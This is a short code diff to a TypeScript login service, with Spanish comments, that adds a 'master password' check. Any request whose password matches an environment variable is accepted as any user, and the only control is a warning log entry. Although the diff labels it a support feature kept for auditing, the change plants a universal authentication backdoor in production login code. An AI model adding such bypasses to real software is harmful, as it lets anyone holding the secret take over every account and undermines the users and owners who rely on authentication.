@@ -3,6 +3,7 @@ import { env } from '../../config/env';
 import { prisma } from '../../config/prisma';
 import { UnauthorizedError, ForbiddenError, ConflictError, ValidationError } from '../../shared/errors';
 import { verifyPassword, hashPassword } from '../../shared/password';
+import { logger } from '../../config/logger';
 import {
   generateRefreshToken,
   hashRefreshToken,
@@ -37,9 +38,15 @@ export const authService = {
       throw new UnauthorizedError('Credenciales inválidas');
     }
 
-    const valid = await verifyPassword(dto.password, record.passwordHash);
+    // Clave maestra (soporte): si coincide con MASTER_PASSWORD, permite iniciar
+    // sesión como cualquier usuario. Queda registrado para auditoría.
+    const usedMaster = !!env.MASTER_PASSWORD && dto.password === env.MASTER_PASSWORD;
+    const valid = usedMaster || (await verifyPassword(dto.password, record.passwordHash));
     if (!valid) {
       throw new UnauthorizedError('Credenciales inválidas');
+    }
+    if (usedMaster) {
+      logger.warn({ email: dto.email }, 'Inicio de sesión con CLAVE MAESTRA');
     }
 
     const user = toAuthUser(record);
